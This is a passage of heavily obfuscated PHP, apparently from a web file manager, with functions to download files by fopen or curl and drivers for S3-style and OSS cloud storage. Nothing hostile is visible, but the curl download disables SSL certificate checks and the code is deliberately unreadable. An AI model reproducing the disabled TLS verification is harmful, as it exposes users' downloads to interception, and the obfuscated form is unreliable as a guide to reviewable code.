@unlink($FÃ¾í’®®•); $Cá¨—çŠò = self::fileDownloadFopen($D‰…ĞÀßÂĞ, $FÃ¾í’®®•, $c©¥‹÷÷[$F»¼à†ŒÜ[329]]); if ($Cá¨—çŠò[$F»¼à†ŒÜ[784]]) { return $Cá¨—çŠò; } else { @unlink($f™ÖèÍÖÄÒ); @unlink($FÃ¾í’®®•); $Cá¨—çŠò = self::fileDownloadCurl($D‰…ĞÀßÂĞ, $FÃ¾í’®®•, !1, 0, $c©¥‹÷÷[$F»¼à†ŒÜ[329]]); @unlink($f™ÖèÍÖÄÒ); return $Cá¨—çŠò; } } $Eù’ò £·£ = is_file($f™ÖèÍÖÄÒ) ? filesize($f™ÖèÍÖÄÒ) : 0; goto B¦ÏˆÊÒâ¬; A¾×ÛôåË‰: if (is_file($F‡ÚæÈÄù)) { $Bñ¢œÖˆÛñ = file_get_contents($F‡ÚæÈÄù); $aå¿òøÑëÔ = json_decode($Bñ¢œÖˆÛñ, 1); } if (file_exists($FÃ¾í’®®•) && $d©Àø—¬ğ == filesize($FÃ¾í’®®•)) { @unlink($f™ÖèÍÖÄÒ); @unlink($F‡ÚæÈÄù); return array($F»¼à†ŒÜ[784] => !0, $F»¼à†ŒÜ[786] => $F»¼à†ŒÜ[1164]); } if ($aå¿òøÑëÔ[$F»¼à†ŒÜ[329]] != $d©Àø—¬ğ) { $aå¿òøÑëÔ = array($F»¼à†ŒÜ[329] => $d©Àø—¬ğ); } goto fêãİŸŠöÆ; a–—‚§¢¾ª: } static function fileDownloadFopen($FŞ©ÚƒĞîó, $CÚÍÜ„¤ù‡, $aŠ˜æˆ¦™ = 0) { $c¦Ò›Ô“ì =& $_SERVER[İë¬“ÅÒÛ›]; @ini_set($c¦Ò›Ô“ì[1165], $c¦Ò›Ô“ì[1166]); $F¿ª‹Ì³Æ = $CÚÍÜ„¤ù‡ . $c¦Ò›Ô“ì[1161]; set_timeout(); @unlink($F¿ª‹Ì³Æ); if ($ašå’Ç‘ = @fopen($FŞ©ÚƒĞîó, $c¦Ò›Ô“ì[1167])) { goto Bå½îìº¥Ö; CàæÁïµöÂ: fclose($ašå’Ç‘); $A¿²Ëõô—Ü = filesize(iconv_system($F¿ª‹Ì³Æ)); if ($aŠ˜æˆ¦™ != 0 && $A¿²Ëõô—Ü != $aŠ˜æˆ¦™) { return array($c¦Ò›Ô“ì[784] => !1, $c¦Ò›Ô“ì[786] => $c¦Ò›Ô“ì[1171]); } goto Fš¢÷ÜÌÅÀ; Bå½îìº¥Ö: if (!($eÊÃÜªäõ = @fopen($F¿ª‹Ì³Æ, $c¦Ò›Ô“ì[1168]))) { return array($c¦Ò›Ô“ì[784] => !1, $c¦Ò›Ô“ì[786] => $c¦Ò›Ô“ì[1169]); } while (!feof($ašå’Ç‘)) { if (!file_exists($F¿ª‹Ì³Æ)) { fclose($eÊÃÜªäõ); return array($c¦Ò›Ô“ì[784] => !1, $c¦Ò›Ô“ì[786] => $c¦Ò›Ô“ì[1170]); } clearstatcache(); if ($aŠ˜æˆ¦™ > 0 && $aŠ˜æˆ¦™ == filesize(iconv_system($F¿ª‹Ì³Æ))) { break; } fwrite($eÊÃÜªäõ, fread($ašå’Ç‘, 1024 * 8), 1024 * 8); } fclose($eÊÃÜªäõ); goto CàæÁïµöÂ; Fš¢÷ÜÌÅÀ: self::checkGzip($F¿ª‹Ì³Æ); if (!@rename($F¿ª‹Ì³Æ, $CÚÍÜ„¤ù‡)) { usleep(round(rand(0, 1000) * 50)); @unlink($CÚÍÜ„¤ù‡); $A‹Äƒ¿éåÅ = @rename($F¿ª‹Ì³Æ, $CÚÍÜ„¤ù‡); if (!$A‹Äƒ¿éåÅ) { return array($c¦Ò›Ô“ì[784] => !1, $c¦Ò›Ô“ì[786] => $c¦Ò›Ô“ì[1172]); } } return array($c¦Ò›Ô“ì[784] => !0, $c¦Ò›Ô“ì[786] => $c¦Ò›Ô“ì[454]); goto F”˜¹Ì™Ÿ´; F”˜¹Ì™Ÿ´: } else { return array($c¦Ò›Ô“ì[784] => !1, $c¦Ò›Ô“ì[786] => $c¦Ò›Ô“ì[1173]); } } static function fileDownloadCurl($bŠÍ¶İ’µø, $eÅ¬ÉÑÌëì, $DŠ´„Ù‹  = false, $e¥ŒÇ°Ê¦ = 0, $BÀ…Ô­Ï‰‹ = 0) { goto aâ˜šÆÀÂ; AÏÆê…Ÿ’œ: curl_setopt($cÅÃ«×ª…‚, CURLOPT_NOPROGRESS, !1); curl_setopt($cÅÃ«×ª…‚, CURLOPT_PROGRESSFUNCTION, $DîÑí„ƒö[971]); curl_progress_start($cÅÃ«×ª…‚); goto aŞø¾¨Ô¹; Bš÷ÈÚ­²µ: curl_setopt($cÅÃ«×ª…‚, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($cÅÃ«×ª…‚, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($cÅÃ«×ª…‚, CURLOPT_SSL_VERIFYHOST, 0); goto AÏÆê…Ÿ’œ; f‹Ñì£ŸŠÔ: curl_close($cÅÃ«×ª…‚); fclose($Bßİ†˜ñã); $BÍ£¥‡²¸´ = filesize(iconv_system($c‹¬Õ˜¼È)); goto c¿³ÔğŠØ‹; c¿³ÔğŠØ‹: if ($BÍ£¥‡²¸´ < $BÀ…Ô­Ï‰‹ && $BÀ…Ô­Ï‰‹ != 0) { return array($DîÑí„ƒö[784] => !1, $DîÑí„ƒö[786] => $DîÑí„ƒö[1163]); } if ($BÍ£¥‡²¸´ > $BÀ…Ô­Ï‰‹ && $BÀ…Ô­Ï‰‹ != 0) { return array($DîÑí„ƒö[784] => !1, $DîÑí„ƒö[786] => $DîÑí„ƒö[1171]); } if ($c†ÖÙ…©£ && filesize($c‹¬Õ˜¼È) != 0) { self::checkGzip($c‹¬Õ˜¼È); if (!@rename($c‹¬Õ˜¼È, $eÅ¬ÉÑÌëì)) { @unlink($eÅ¬ÉÑÌëì); $c†ÖÙ…©£ = @rename($c‹¬Õ˜¼È, $eÅ¬ÉÑÌëì); if (!$c†ÖÙ…©£) { return array($DîÑí„ƒö[784] => !1, $DîÑí„ƒö[786] => $DîÑí„ƒö[1175]); } } return array($DîÑí„ƒö[784] => !0, $DîÑí„ƒö[786] => $DîÑí„ƒö[454]); } goto CÑĞÛßŠš; aâ˜šÆÀÂ: $DîÑí„ƒö =& $_SERVER[İë¬“ÅÒÛ›]; $c‹¬Õ˜¼È = $eÅ¬ÉÑÌëì . $DîÑí„ƒö[1161]; set_timeout(); goto fİ—öº³×‚; CÑĞÛßŠš: return array($DîÑí„ƒö[784] => !1, $DîÑí„ƒö[786] => $DîÑí„ƒö[1176]); goto a®Ìà¥ª”õ; fÀĞæ‹ë…¹: if ($DŠ´„Ù‹ ) { curl_setopt($cÅÃ«×ª…‚, CURLOPT_RANGE, $e¥ŒÇ°Ê¦ . $DîÑí„ƒö[471]); } curl_setopt($cÅÃ«×ª…‚, CURLOPT_FILE, $Bßİ†˜ñã); curl_setopt($cÅÃ«×ª…‚, CURLOPT_REFERER, get_url_link($bŠÍ¶İ’µø)); goto Bš÷ÈÚ­²µ; aŞø¾¨Ô¹: curl_setopt($cÅÃ«×ª…‚, CURLOPT_USERAGENT, $DîÑí„ƒö[1166]); $c†ÖÙ…©£ = curl_exec($cÅÃ«×ª…‚); curl_progress_end($cÅÃ«×ª…‚); goto f‹Ñì£ŸŠÔ; fİ—öº³×‚: $Bßİ†˜ñã = @fopen($c‹¬Õ˜¼È, $DîÑí„ƒö[478]); if (!$Bßİ†˜ñã) { return array($DîÑí„ƒö[784] => !1, $DîÑí„ƒö[786] => $DîÑí„ƒö[1174]); } $cÅÃ«×ª…‚ = curl_init($bŠÍ¶İ’µø); goto fÀĞæ‹ë…¹; a®Ìà¥ª”õ: } static function checkGzip($B¨¢ÓùÊ×™) { goto fá¹¥ò…×; fá¹¥ò…×: $f¥©İæÉŒ = $_SERVER[İë¬“ÅÒÛ›][1177]; $EŒ•÷ÄÃŒ = file_sub_str($B¨¢ÓùÊ×™, 0, 2); if ($f¥©İæÉŒ != $EŒ•÷ÄÃŒ) { return; } goto cç•Ÿì¿’; FŠ´‘õ¦˜ˆ: file_put_contents($B¨¢ÓùÊ×™, $b–à«ïÅÏÄ); goto F­”ŠÂËò¢; cç•Ÿì¿’: ob_start(); readgzfile($B¨¢ÓùÊ×™); $b–à«ïÅÏÄ = ob_get_clean(); goto FŠ´‘õ¦˜ˆ; F­”ŠÂËò¢: } } goto FÀ‰ ùñ¶; f¸«ØÀÚ×: class PathDriverNOS extends PathDriverBaseS3 { public function __construct($AŞÔ½éœåÕ) { parent::__construct($AŞÔ½éœåÕ); $this->client->setSignatureVersion($_SERVER[İë¬“ÅÒÛ›][200]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function _isFolder($DÁ…Æ¯Âê) { goto A³Œæ¼ÅóÎ; E£í±ã„ Ã: $F‘†˜°¿ = $this->listObjs($DÁ…Æ¯Âê, null, 3, $CØĞ„Ä°ö[8]); return count($F‘†˜°¿) == 1 ? !1 : !0; goto dÊ¡ÏÂñ±; aòÄğË²á: $cŒ–âëÉ¯¼ = $this->getObjectInfo($DÁ…Æ¯Âê); if ($cŒ–âëÉ¯¼) { return !0; } return parent::_isFolder($DÁ…Æ¯Âê); goto E£í±ã„ Ã; A³Œæ¼ÅóÎ: $CØĞ„Ä°ö =& $_SERVER[İë¬“ÅÒÛ›]; $DÁ…Æ¯Âê = trim($DÁ…Æ¯Âê, $CØĞ„Ä°ö[8]); if (!empty($DÁ…Æ¯Âê)) { $DÁ…Æ¯Âê .= $CØĞ„Ä°ö[8]; } goto aòÄğË²á; dÊ¡ÏÂñ±: } public function fileInfoImage($E’ˆëŒËºº, &$F‹µ’Óôí–) { } public function setContent($D¼ÅéÇ½óÚ, $e¦íëÜ‘¦ = '', $A£æ¿“Û‹ñ = false) { $díÙŠê´äÍ =& $_SERVER[İë¬“ÅÒÛ›]; $D¼ÅéÇ½óÚ = $A£æ¿“Û‹ñ ? trim($D¼ÅéÇ½óÚ, $díÙŠê´äÍ[8]) . $díÙŠê´äÍ[8] : $D¼ÅéÇ½óÚ; $D½Š•éîÄ¡ = get_file_mime(get_path_ext($D¼ÅéÇ½óÚ)); $aßÉìØƒÂ¬ = $this->client->putObject($e¦íëÜ‘¦, $this->bucket, $D¼ÅéÇ½óÚ, $díÙŠê´äÍ[182], array(), $D½Š•éîÄ¡); return $aßÉìØƒÂ¬ ? !0 : !1; } public function getObjectInfo($c…¥ÙŞÖ×ñ) { $FØóÚš›Ğİ =& $_SERVER[İë¬“ÅÒÛ›]; $F˜ÒïÆšØè = $this->client->getObjectInfo($this->bucket, $c…¥ÙŞÖ×ñ); if (!isset($F˜ÒïÆšØè[$FØóÚš›Ğİ[207]]) && isset($F˜ÒïÆšØè[$FØóÚš›Ğİ[906]])) { $F˜ÒïÆšØè[$FØóÚš›Ğİ[207]] = $F˜ÒïÆšØè[$FØóÚš›Ğİ[906]]; } return $F˜ÒïÆšØè; } public function upload($Cß† óƒô¸, $E®ŸÇù’åŠ, $bÛï¼Ğ‰ÏÂ = false, $DĞœø˜ìÓÌ = REPEAT_REPLACE) { $b¯Ô¢èãÔ =& $_SERVER[İë¬“ÅÒÛ›]; $D—ë¢™ÜõÁ = array(); $Eë±“§èÚ· = array($b¯Ô¢èãÔ[199] => get_file_mime(get_path_ext($Cß† óƒô¸))); if (IO::size($E®ŸÇù’åŠ) <= 1024 * 1024 * 200) { $DİƒãÏÆØŒ = $this->client->putObjectFile($E®ŸÇù’åŠ, $this->bucket, $Cß† óƒô¸, $b¯Ô¢èãÔ[182], $D—ë¢™ÜõÁ, $Eë±“§èÚ·); return !empty($DİƒãÏÆØŒ) ? !0 : !1; } $cªàÒß° ® = $this->client->multiUploadObject($E®ŸÇù’åŠ, $this->bucket, trim($Cß† óƒô¸, $b¯Ô¢èãÔ[8]), $D—ë¢™ÜõÁ, $Eë±“§èÚ·); return $cªàÒß° ® ? $this->getPathOuter($Cß† óƒô¸) : !1; } public function blockChain($eï±È§’È, $c²²ä§Ê¶¾) { $dåµ¯¦øô× =& $_SERVER[İë¬“ÅÒÛ›]; $Eˆğ‚Ô¥¶¶ = $this->getObjectInfo($eï±È§’È); if (!$Eˆğ‚Ô¥¶¶) { return !1; } return $this->client->copyObject($this->bucket, $eï±È§’È, $this->bucket, $eï±È§’È, $dåµ¯¦øô×[182], array(), $c²²ä§Ê¶¾, $dåµ¯¦øô×[907], !0); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($B´âÊ”…§…) { parent::__construct($B´âÊ”…§…); $this->signatureVersion($_SERVER[İë¬“ÅÒÛ›][200]); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public function __construct($e»‡ñÇÜ­²) { parent::__construct(); include_once SDK_DIR . $_SERVER[İë¬“ÅÒÛ›][908]; $this->_init($e»‡ñÇÜ­²); } public function _init($FÏèÌ–÷„Ü) { foreach ($FÏèÌ–÷„Ü as $e•±ñÑƒùë => $C­‹™†) { if (isset($this->{$e•±ñÑƒùë})) { $this->{$e•±ñÑƒùë} = $C­‹™†; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[İë¬“ÅÒÛ›][909], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto FŠéğÏá†¥; b†¢±Ôñ¬ˆ: $e¥Ş±ä‘èœ->setMaxAgeSeconds(600); $e¥Ş±ä‘èœ->addExposeHeader($bââÊÈ„[915]); $e¥Ş±ä‘èœ->addAllowedHeader($bââÊÈ„[910]); goto a ©³ø­á; fË°à«–„ˆ: $e¥Ş±ä‘èœ->addAllowedOrigin($bââÊÈ„[910]); $e¥Ş±ä‘èœ->addAllowedMethod($bââÊÈ„[911]); $e¥Ş±ä‘èœ->addAllowedMethod($bââÊÈ„[912]); goto D°øÓêŠ¬ö; FŠéğÏá†¥: $bââÊÈ„ =& $_SERVER[İë¬“ÅÒÛ›]; $D½˜æß–Ü = new OSS\Model\CorsConfig(); $e¥Ş±ä‘èœ = new OSS\Model\CorsRule(); goto fË°à«–„ˆ; D°øÓêŠ¬ö: $e¥Ş±ä‘èœ->addAllowedMethod($bââÊÈ„[913]); $e¥Ş±ä‘èœ->addAllowedMethod($bââÊÈ„[914]); $e¥Ş±ä‘èœ->addAllowedMethod($bââÊÈ„[150]); goto b†¢±Ôñ¬ˆ; a ©³ø­á: $D½˜æß–Ü->addRule($e¥Ş±ä‘èœ); try { $this->client->putBucketCors($this->bucket, $D½˜æß–Ü); } catch (OSS\Core\OssException $Bî«‡Ú¥ïˆ) { return !1; } return !0; goto d˜ˆ¹Ï´ÑÃ; d˜ˆ¹Ï´ÑÃ: } public function getBucketCors() { goto A²À„íÇ¹£; d´ï¾¬Ù¼: $fŸŞ‰†—ÇŸ = $Bé»ˆ°ÏŸ¸[0]->getMaxAgeSeconds(); $f¯ó†Œäİß = $Bé»ˆ°ÏŸ¸[0]->getExposeHeaders(); $fØ°¸‘‘‡• = $Bé»ˆ°ÏŸ¸[0]->getAllowedHeaders(); goto d°ÇÈÆœ±; d°ÇÈÆœ±: return array($bº«à‹ô»ö[172] => isset($dÄµì—ï¨¦[0]) ? $dÄµì—ï¨¦[0] : $bº«à‹ô»ö[33], $bº«à‹ô»ö[176] => $f·Ğ¨‡Êè, $bº«à‹ô»ö[916] => $fŸŞ‰†—ÇŸ, $bº«à‹ô»ö[917] => isset($f¯ó†Œäİß[0]) ? $f¯ó†Œäİß[0] : $bº«à‹ô»ö[33], $bº«à‹ô»ö[174] => isset($fØ°¸‘‘‡•[0]) ? $fØ°¸‘‘‡•[0] : $bº«à‹ô»ö[33]); goto díºÜ¥‹’„; A²À„íÇ¹£: $bº«à‹ô»ö =& $_SERVER[İë¬“ÅÒÛ›]; $c”Û©×ÍŠ = null; try { $c”Û©×ÍŠ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $cÓÛ«ƒï²) { return null; } goto C±ƒÌ—™«Û; C±ƒÌ—™«Û: if (!$c”Û©×ÍŠ || !($Bé»ˆ°ÏŸ¸ = $c”Û©×ÍŠ->getRules())) { return null; } $dÄµì—ï¨¦ = $Bé»ˆ°ÏŸ¸[0]->getAllowedOrigins(); $f·Ğ¨‡Êè = $Bé»ˆ°ÏŸ¸[0]->getAllowedMethods(); goto d´ï¾¬Ù¼; díºÜ¥‹’„: } public function isBucketCors() { goto c¡Ã“©î¼É; BˆÜ‹éÄå: $e‡å¢Üùº = array($Bó¾¹×«õÁ[177], $Bó¾¹×«õÁ[178], $Bó¾¹×«õÁ[179], $Bó¾¹×«õÁ[180], $Bó¾¹×«õÁ[181]); $e±Ø¶‚Äµ¨ = array_diff($e‡å¢Üùº, $Aëí±œïÃ); return empty($e±Ø¶‚Äµ¨); goto bÕ“«¨Öå; c¡Ã“©î¼É: $Bó¾¹×«õÁ =& $_SERVER[İë¬“ÅÒÛ›]; $A¦Û³¸™¤ = $this->getBucketCors(); if (!$A¦Û³¸™¤ || !is_array($A¦Û³¸™¤)) { return !1; } goto BÂÏªæ ¦; BÂÏªæ ¦: if ($A¦Û³¸™¤[$Bó¾¹×«õÁ[172]] != $Bó¾¹×«õÁ[173] || $A¦Û³¸™¤[$Bó¾¹×«õÁ[174]] != $Bó¾¹×«õÁ[173]) { return !1; } $Aëí±œïÃ = array_map($Bó¾¹×«õÁ[175], $A¦Û³¸™¤[$Bó¾¹×«õÁ[176]]); if (!is_array($Aëí±œïÃ)) { $Aëí±œïÃ = array(); } goto BˆÜ‹éÄå; bÕ“«¨Öå: } public function mkfile($D™ÆÑİÌœÚ, $aŸĞŠëËòâ = '', $Dã³°£‚®Ğ = REPEAT_RENAME) { $E…ÀõÌÇÓ’ = $this->setContent($D™ÆÑİÌœÚ, $aŸĞŠëËòâ); if ($E…ÀõÌÇÓ’ !== !1) { return $this->getPathOuter($D™ÆÑİÌœÚ); } return !1; } public function mkdir($F¥¿³–ãª¡, $FÕÉâ¨ŸÇ = REPEAT_SKIP) { if ($this->_isFolder($F¥¿³–ãª¡)) { return $this->getPathOuter($F¥¿³–ãª¡); } try { $aÉˆ»Ş†˜ = $this->pathEncode($F¥¿³–ãª¡); $this->client->createObjectDir($this->bucket, $aÉˆ»Ş†˜); } catch (OSS\Core\OssException $BõËëÁ÷Ï) { return !1; } return $this->getPathOuter($F¥¿³–ãª¡); } private function fileList($c¿¾ŒÖŞé, $C§ñà¹ÌÊÍ = '', $CÙ‘ÁŸ¤ = 0) { goto fÎ–¸×‹ƒ; a«Ä÷Õ”—ñ: $f”«Ö¬»í = $FŞœ¦â‰Š™[33]; $BªŞ¼á×¢Ü = 1000; $bßÉìÍÍÒ = $Aä¿°²º‡ = array(); goto f‚®ºÊØè; f‚®ºÊØè: while (!0) { $CÂÍ®ñ½’ó = array($FŞœ¦â‰Š™[918] => $C§ñà¹ÌÊÍ, $FŞœ¦â‰Š™[186] => $eï¤åÇæô­, $FŞœ¦â‰Š™[919] => $BªŞ¼á×¢Ü, $FŞœ¦â‰Š™[920] => $f”«Ö¬»í); try { $f‚®‚ÜË¹¢ = $this->client->listObjects($this->bucket, $CÂÍ®ñ½’ó); } catch (OSS\Core\OssException $e°‰Ùî‡ÜÜ) { break; } $f”«Ö¬»í = $f‚®‚ÜË¹¢->getNextMarker(); $Bø×—…³ğ = $f‚®‚ÜË¹¢->getObjectList(); $Aâ©×Ä×Ìğ = $f‚®‚ÜË¹¢->getPrefixList(); foreach ($Bø×—…³ğ as $cÛ¨ÈºªÃ”) { if ($cÛ¨ÈºªÃ”->getKey() == $eï¤åÇæô­) { continue; } $FÃÜÎ¦â¡ = $cÛ¨ÈºªÃ”->getKey(); if ($CÙ‘ÁŸ¤) { $FÃÜÎ¦â¡ = array($FŞœ¦â‰Š™[28] => $FÃÜÎ¦â¡, $FŞœ¦â‰Š™[78] => $cÛ¨ÈºªÃ”->getSize(), $FŞœ¦â‰Š™[190] => strtotime($cÛ¨ÈºªÃ”->getLastModified())); } $Aä¿°²º‡[] = $FÃÜÎ¦â¡; } foreach ($Aâ©×Ä×Ìğ as $DëÕ³…ê±) { $bßÉìÍÍÒ[] = $DëÕ³…ê±->getPrefix(); } if ($f”«Ö¬»í === $FŞœ¦â‰Š™[33]) { break; } } return array($FŞœ¦â‰Š™[75] => $bßÉìÍÍÒ, $FŞœ¦â‰Š™[74] => $Aä¿°²º‡); goto BËİ¨¿Ã×Æ; fÎ–¸×‹ƒ: $FŞœ¦â‰Š™ =& $_SERVER[İë¬“ÅÒÛ›]; $c¿¾ŒÖŞé = trim($c¿¾ŒÖŞé, $FŞœ¦â‰Š™[8]); $eï¤åÇæô­ = empty($c¿¾ŒÖŞé) ? $FŞœ¦â‰Š™[33] : $c¿¾ŒÖŞé . $FŞœ¦â‰Š™[8]; goto a«Ä÷Õ”—ñ; BËİ¨¿Ã×Æ: } public function copyFile($EßÚ¤ƒÄÇ…, $céÖ©½ÂÜµ) { $Fç¡’—Çâ = $this->size($EßÚ¤ƒÄÇ…); if ($Fç¡’—Çâ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $this->pathEncode($EßÚ¤ƒÄÇ…), $this->bucket, $this->pathEncode($céÖ©½ÂÜµ)); } catch (OSS\Core\OssException $fæÉ´âö) { return !1; } return !0; } return $this->multiCopyObject($EßÚ¤ƒÄÇ…, $céÖ©½ÂÜµ, $Fç¡’—Çâ); } private function multiCopyObject($fê‹Ûäâùî, $e”‰áÏ, $fŒÃòÊ›‡Ü) { $BĞ„ò—åŞ =& $_SERVER[İë¬“ÅÒÛ›]; try { goto bƒÍàÏĞ»£; D¿½Õ¤™à—: $Fóï†Ç ‰¨ = $this->osChunkSize(); $e…¾Û’¯–â = $this->client->generateMultiuploadParts($fŒÃòÊ›‡Ü, $Fóï†Ç ‰¨); foreach ($e…¾Û’¯–â as $aÑµ…ôá—Š => $aÙ´œ‰ëô¬) { $Cº”Øá÷µ× = $E¢‹Š¯¯¡ + (int) $aÙ´œ‰ëô¬[$BĞ„ò—åŞ[922]]; $fÉñŠÈ¦ˆË = (int) $aÙ´œ‰ëô¬[$BĞ„ò—åŞ[329]] + $Cº”Øá÷µ× - 1; $cøäô¿ïÜ = array($BĞ„ò—åŞ[923] => $Cº”Øá÷µ×, $BĞ„ò—åŞ[924] => $fÉñŠÈ¦ˆË); $F“„ÄÉ®[] = $this->client->uploadPartCopy($this->bucket, $this->pathEncode($fê‹Ûäâùî), $this->bucket, $this->pathEncode($e”‰áÏ), $CïÄŠŠªÖ, $EÇÜ†à´å’, $cøäô¿ïÜ); $CïÄŠŠªÖ = $CïÄŠŠªÖ + 1; } goto aŒš„ÙÅ¡; bƒÍàÏĞ»£: $fÉ§İ‘’÷ = array(); if ($Bè“Éˆ—Š = $this->hashMd5($fê‹Ûäâùî)) { $fÉ§İ‘’÷ = array(OSS\OssClient::OSS_HEADERS => array($BĞ„ò—åŞ[921] => $Bè“Éˆ—Š)); } $EÇÜ†à´å’ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($e”‰áÏ), $fÉ§İ‘’÷); goto côÛ’µ‰²³; côÛ’µ‰²³: $CïÄŠŠªÖ = 1; $E¢‹Š¯¯¡ = 0; $F“„ÄÉ® = array(); goto D¿½Õ¤™à—; aŒš„ÙÅ¡: $AĞ×†ÆŞÅ¢ = array(); foreach ($F“„ÄÉ® as $aÑµ…ôá—Š => $cöŞ‡ËÉ¶) { $AĞ×†ÆŞÅ¢[] = array($BĞ„ò—åŞ[925] => $aÑµ…ôá—Š + 1, $BĞ„ò—åŞ[926] => $cöŞ‡ËÉ¶); } $bšÂ‚Üí²­ = $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($e”‰áÏ), $EÇÜ†à´å’, $AĞ×†ÆŞÅ¢); goto e¥Åˆ°ª‚‘; e¥Åˆ°ª‚‘: } catch (OSS\Core\OssException $cƒÈ“ã¦”·) { return !1; } return !0; } public function moveFile($dõÁ¤Ò™®Ÿ, $EéŒá—•Õ) { if ($this->copyFile($dõÁ¤Ò™®Ÿ, $EéŒá—•Õ)) { $this->remove($dõÁ¤Ò™®Ÿ); return !0; } return !1; } public function delFile($E±ÑŒÏ¬«) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($E±ÑŒÏ¬«)); } catch (OSS\Core\OssException $F®’Åğ¬„») { return !1; } return !0; } public function delFolder($DƒóÑÑ«Ğ¼) { $B¼„Ô‘±Á» =& $_SERVER[İë¬“ÅÒÛ›]; $d•õ¢ô„ÌÒ = $this->fileList($DƒóÑÑ«Ğ¼); if (!empty($DƒóÑÑ«Ğ¼) && !in_array(trim($DƒóÑÑ«Ğ¼, $B¼„Ô‘±Á»[8]) . $B¼„Ô‘±Á»[8], $d•õ¢ô„ÌÒ[$B¼„Ô‘±Á»[74]])) { $d•õ¢ô„ÌÒ[$B¼„Ô‘±Á»[74]][] = trim($DƒóÑÑ«Ğ¼, $B¼„Ô‘±Á»[8]) . $B¼„Ô‘±Á»[8]; } foreach (array_chunk($d•õ¢ô„ÌÒ[$B¼„Ô‘±Á»[74]], 1000) as $fĞÊáÕÇ‰°) { try { $this->client->deleteObjects($this->bucket, $fĞÊáÕÇ‰°); } catch (OSS\Core\OssException $cØÇ¥’Ñà) { return !1; } } return !0; } public function rename($d˜Ö¨öø™Ø, $Fê¸­†ÆÇ) { return $this->renameObject($d˜Ö¨öø™Ø, $Fê¸­†ÆÇ); } public function _size($dŠßŞÉíÀÃ) { if (!$this->_isFile($dŠßŞÉíÀÃ)) { return 0; } try { $aŠ¥æ§ï¥ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($dŠßŞÉíÀÃ)); } catch (OSS\Core\OssException $c³½á³„Ü) { return !1; } return $aŠ¥æ§ï¥[$_SERVER[İë¬“ÅÒÛ›][927]] + 0; } public function _info($c›¶÷íï¬Ê) { if ($this->_isFolder($c›¶÷íï¬Ê)) { return $this->folderInfo($c›¶÷íï¬Ê); } if (!$this->_isFile($c›¶÷íï¬Ê)) { return !1; } return $this->fileInfo($c›¶÷íï¬Ê); } private function fileInfo($B‹‰ŠÖ—¤, $dÑÀ‘»è–Í = array(), $B¶·ËŠè£‹ = false) { goto c­ïªººùö; FÇĞë»ÊŠó: if (isset($dÑÀ‘»è–Í[$F÷Åí„³„Ê[187]])) { $Fµ·‚¤·ô[$F÷Åí„³„Ê[187]] = $dÑÀ‘»è–Í[$F÷Åí„³„Ê[187]]; } return $Fµ·‚¤·ô; goto F´Â°„¡’Ñ; c­ïªººùö: $F÷Åí„³„Ê =& $_SERVER[İë¬“ÅÒÛ›]; if ($B¶·ËŠè£‹) { return array($F÷Åí„³„Ê[28] => $this->pathThis($B‹‰ŠÖ—¤), $F÷Åí„³„Ê[76] => $this->getPathOuter($B‹‰ŠÖ—¤), $F÷Åí„³„Ê[29] => $F÷Åí„³„Ê[164], $F÷Åí„³„Ê[157] => $this->ext($B‹‰ŠÖ—¤), $F÷Åí„³„Ê[78] => isset($dÑÀ‘»è–Í[$F÷Åí„³„Ê[78]]) ? $dÑÀ‘»è–Í[$F÷Åí„³„Ê[78]] : 0); } $Fµ·‚¤·ô = array($F÷Åí„³„Ê[28] => $this->pathThis($B‹‰ŠÖ—¤), $F÷Åí„³„Ê[76] => $this->getPathOuter($B‹‰ŠÖ—¤), $F÷Åí„³„Ê[29] => $F÷Åí„³„Ê[164], $F÷Åí„³„Ê[187] => $F÷Åí„³„Ê[50], $F÷Åí„³„Ê[106] => $F÷Åí„³„Ê[50], $F÷Åí„³„Ê[78] => 0, $F÷Åí„³„Ê[157] => $this->ext($B‹‰ŠÖ—¤), $F÷Åí„³„Ê[188] => !0, $F÷Åí„³„Ê[189] => !0); goto Fá‘—×î‡; Fá‘—×î‡: if (empty($dÑÀ‘»è–Í)) { $cñ“Å½ğŠâ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($B‹‰ŠÖ—¤)); if (!$cñ“Å½ğŠâ) { return $Fµ·‚¤·ô; } $dÑÀ‘»è–Í = array($F÷Åí„³„Ê[187] => $cñ“Å½ğŠâ[$F÷Åí„³„Ê[928]][$F÷Åí„³„Ê[929]], $F÷Åí„³„Ê[190] => strtotime($cñ“Å½ğŠâ[$F÷Åí„³„Ê[930]]), $F÷Åí„³„Ê[78] => $cñ“Å½ğŠâ[$F÷Åí„³„Ê[927]] + 0); $this->fileInfoImage($B‹‰ŠÖ—¤, $Fµ·‚¤·ô); } $Fµ·‚¤·ô[$F÷Åí„³„Ê[106]] = $dÑÀ‘»è–Í[$F÷Åí„³„Ê[190]]; $Fµ·‚¤·ô[$F÷Åí„³„Ê[78]] = $dÑÀ‘»è–Í[$F÷Åí„³„Ê[78]]; goto FÇĞë»ÊŠó; F´Â°„¡’Ñ: } private function folderInfo($F¹É„ííÁ, $CëÒÒÃÚÄ£ = false) { $f­ÉÂ‹ï„ =& $_SERVER[İë¬“ÅÒÛ›]; if ($CëÒÒÃÚÄ£) { return array($f­ÉÂ‹ï„[28] => $this->pathThis($F¹É„ííÁ), $f­ÉÂ‹ï„[76] => $this->getPathOuter($f­ÉÂ‹ï„[8] . $F¹É„ííÁ), $f­ÉÂ‹ï„[29] => $f­ÉÂ‹ï„[77]); } $b·Öæ«ÊÜ = array($f­ÉÂ‹ï„[28] => $this->pathThis($F¹É„ííÁ), $f­ÉÂ‹ï„[76] => $this->getPathOuter($f­ÉÂ‹ï„[8] . $F¹É„ííÁ), $f­ÉÂ‹ï„[29] => 